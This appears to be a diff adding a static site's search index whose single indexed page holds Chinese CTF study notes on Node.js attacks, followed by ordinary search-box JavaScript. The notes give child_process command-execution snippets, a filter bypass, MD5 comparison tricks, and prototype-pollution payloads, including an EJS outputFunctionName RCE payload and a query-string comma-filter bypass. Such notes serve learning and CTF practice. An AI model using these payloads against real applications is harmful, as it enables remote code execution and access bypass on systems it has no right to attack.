+    
+    
+    
+
+
+    
+
+    
+
+    index.add(
+            {
+                id:  0 ,
+                href: "\/docs\/example-page\/",
+                title: "ctf nodejs test",
+                description: "nodejs test",
+                content: "命令执行 link require('child_process').exec('ls'); //返回值是child_process，不能转字符串 require('child_process').execSync('ls').toString(); //返回值是字符串 require('child_process').spawnSync('ls').stdout.toString();// 返回object，toString转成字符串 //绕过简单的限制 require('child_process')['exe'+'cSync']('ls').toString() 不用child_process读取文件\n__filename //获取当前文件的绝对路径 __dirname //获取当前文件解析过后的文件夹的绝对路径 require('fs').readFileSync(__filename,'utf-8'); //读取当前文件 require('fs').readdirSync('.') //读取当前目录下所有文件 md5 link if(a \u0026\u0026 b \u0026\u0026 a.length===b.length \u0026\u0026 a!==b \u0026\u0026 md5(a+flag)===md5(b+flag)) 传入a[]=1\u0026b[]=2 得到的是[‘1’]和[‘2’] 而nodejs中数组和字符串的拼接如下：\nconsole.log(5+[6,6]); //56,6 console.log(\"5\"+6); //56 console.log(\"5\"+[6,6]); //56,6 console.log(\"5\"+[\"6\",\"6\"]); //56,6 则[‘a’]+flag== ‘a’+flag\n如果传入的是非数字索引，比如[x]=1，那么就会变为js的对象{x:'1'}\nlet a={ x:'1' } console.log(a+\"flag{123}\") //返回的是： [object Object]flag{123} 所以传入a[x]=1\u0026b[x]=1也能绕过，此时a!==b比较的是内存地址，而不是键值。\n原型链污染 link //定义一个类 function Foo() { this.bar = 1 } new Foo() //类内的方法 function Foo() { this.bar = 1 this.show = function() { console.log(this.bar) this.bar=this.bar+1 } } (new Foo()).show() //输出1 //但是每次新建一个foo对象，this.show就会执行一次，show方法是绑定在对象上的，而不是绑定在类上 //使用原型prototype创建类时，就会只创建一次show方法。 function Foo() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let foo = new Foo() foo.show() //输出1 //原型prototype是类Foo的一个属性，所有实例化的对象，都有这个熟悉的内容。 //foo对象天生就有show方法 //通过proto属性可以访问类的原型，即： foo.__proto__==Foo.prototype 总结： prototype是一个类的属性，所有类对象实例化时都会有prototype中的属性和方法\njs中的继承 linkjs中的继承使用的便是prototype\nfunction Father() { this.first_name = 'Donald' this.last_name = 'Trump' } function Son() { this.first_name = 'Melania' } Son.prototype = new Father() let son = new Son() console.log(`Name: ${son.first_name} ${son.last_name}`) //输出：Name: Melania Trump //此过程为：在son中找last_name，如果找不到就在son.__proto__找，如果还找不到，就在son.__proto__.__proto__里找，依次寻找直到null结束，如Object.prototype的__proto__就是null 原型链污染 link原理 link可以访问原型，也可以修改原型的值\nlet foo = {bar: 1} // foo.bar 此时为1 console.log(foo.bar) // 修改foo的原型（即Object） foo.__proto__.bar = 2 // 由于查找顺序的原因，foo.bar仍然是1 console.log(foo.bar) // 此时再用Object创建一个空的zoo对象 let zoo = {} // 查看zoo.bar console.log(zoo.bar) //尽管zoo为空对象，依然输出了1 1 2 //foo.__proto__实际上是一个Object类的实例，所以其实是给这个类新增了一个bar属性。所以新建的zoo继承Object，自然也有bar属性 使用场景 link找到能控制的数组（对象）的键名的操作即可\n对象merge 对象clone function merge(target, source) { for (let key in source) { if (key in source \u0026\u0026 key in target) { merge(target[key], source[key]) } else { target[key] = source[key] } } } 存在target[key] = source[key]，如果key为__proto__呢\nlet o1 = {} let o2 = {a: 1, \"__proto__\": {b: 2}} merge(o1, o2) console.log(o1.a, o1.b) // 输出1 2 o3 = {} console.log(o3.b) //输出空 合并成功了，但是原型链没有被污染。 因为创建o2的过程let o2 = {a: 1, \"__proto__\": {b: 2}}中，__proto__\"已经代表o2的原型了，遍历键名，得到的是a，b，而不是a,__proto__，也就无法修改原型\nlet o1 = {} let o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}') merge(o1, o2) console.log(o1.a, o1.b) o3 = {} console.log(o3.b) //输出1 2 2，原型链被污染 因为在json解析下，__proto__是一个真正的键名，而不代表原型，后面遍历o2时也能正常获取键名。\n例题： link1 link router.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); var flag='flag_here'; var secert = {}; var sess = req.session; let user = {}; utils.copy(user,req.body); if(secert.ctfshow==='36dboy'){ res.end(flag); }else{ return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)}); } }); 因为存在utils.copy函数\nfunction copy(object1, object2){ for (let key in object2) { if (key in object2 \u0026\u0026 key in object1) { copy(object1[key], object2[key]) } else { object1[key] = object2[key] } } } 所以有原型链污染 传入payload：\n{ \"username\": \"a\", \"__proto__\": { \"ctfshow\": \"36dboy\" } } 2 link router.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); res.render('api', { query: Function(query)(query)}); }); 因为所有变量的最顶层是object，所以若当前上下文不存在query，会自动向上查找object的query属性，故可以进行原型链污染\n{\"username\":\"admin\",\"password\":\"admin\",\"__proto__\":{\"query\":\"return global.process.mainModule.constructor._load('child_process').exec('id')\"}} 3 link router.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); var flag='flag_here'; var user = new function(){ this.userinfo = new function(){ this.isVIP = false; this.isAdmin = false; this.isAuthor = false; }; } utils.copy(user.userinfo,req.body); if(user.userinfo.isAdmin){ res.end(flag); }else{ return res.json({ret_code: 2, ret_msg: '登录失败'}); } user.__proto__不是Object，是f()。user.__proto__.__proto__才是，所以需要污染两层。\n{ \"__proto__\": { \"__proto__\": { \"query\": \"return global.process.mainModule.constructor._load('child_process').exec('id')\" } } } 4 link router.get('/', function(req, res, next) { res.type('html'); res.render('index'); }); ejs rce\n{\"__proto__\":{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('id');var __tmp2\"}}} get绕过 link router.get('/', function(req, res, next) { res.type('html'); var flag = 'flag_here'; if(req.url.match(/8c|2c|\\,/ig)){ res.end('where is flag :)'); } var query = JSON.parse(req.query.query); if(query.name==='admin'\u0026\u0026query.password==='ctfshow'\u0026\u0026query.isVIP===true){ res.end(flag); }else{ res.end('where is flag. :)'); } }); 正常传入\n{ \"name\": \"admin\", \"password\": \"ctfshow\", \"isVIP\": true } 但过滤了,和/2c，所以即便req.url不进行url解码，也无法传入逗号。 利用req.query.query的特性：传入的相同get参数会加入一个数组，然后JSON.parse会把数组内的元素拼接在一起。 也就是传入query={\"name\":\"admin\"\u0026query=\"password\":\"%63tfshow\"\u0026query=\"isVIP\":true}的话，第一步得到['{\"name\":\"admin\"','\"password\":\"ctfshow\"','\"isVIP\":true}']，第二步就是目标json。 使用%63是防止\"编码后的%22和C变为2c被过滤。\n"
+            }
+        );
+    index.add(
+            {
+                id:  1 ,
+                href: "\/docs\/",
+                title: "Docs",
+                description: "",
+                content: ""
+            }
+        );
+    search.addEventListener('input', show_results, true);
+
+    function show_results(){
+        const maxResult =  5 ;
+        const minlength =  0 ;
+        var searchQuery = sanitizeHTML(this.value);
+        var results = index.search(searchQuery, {limit: maxResult, enrich: true});
+
+        
+        const flatResults = new Map(); 
+        for (const result of results.flatMap(r => r.result)) {
+        if (flatResults.has(result.doc.href)) continue;
+        flatResults.set(result.doc.href, result.doc);
+        }
+
+        suggestions.innerHTML = "";
+        suggestions.classList.remove('d-none');
+
+        
+        if (searchQuery.length < minlength) {
+            const minCharMessage = document.createElement('div')
+            minCharMessage.innerHTML = `Please type at least <strong>${minlength}</strong> characters`
+            minCharMessage.classList.add("suggestion__no-results");
+            suggestions.appendChild(minCharMessage);
+            return;
+        } else {
+            
+            if (flatResults.size === 0 && searchQuery) {
+                const noResultsMessage = document.createElement('div')
+                noResultsMessage.innerHTML = "No results for" + ` "<strong>${searchQuery}</strong>"`
+                noResultsMessage.classList.add("suggestion__no-results");
+                suggestions.appendChild(noResultsMessage);
+                return;
+            }
+        }
+
+        
+        for(const [href, doc] of flatResults) {
+            const entry = document.createElement('div');
+            suggestions.appendChild(entry);
+
+            const a = document.createElement('a');
+            a.href = href;
+            entry.appendChild(a);
+
+            const title = document.createElement('span');
+            title.textContent = doc.title;
+            title.classList.add("suggestion__title");
+            a.appendChild(title);
+
+            const description = document.createElement('span');
+            description.textContent = doc.description;
+            description.classList.add("suggestion__description");
+            a.appendChild(description);
+
+            suggestions.appendChild(entry);
+
+            if(suggestions.childElementCount == maxResult) break;
+        }
+    }
+    }());
+</script>
+        
+    </body>
+</html>
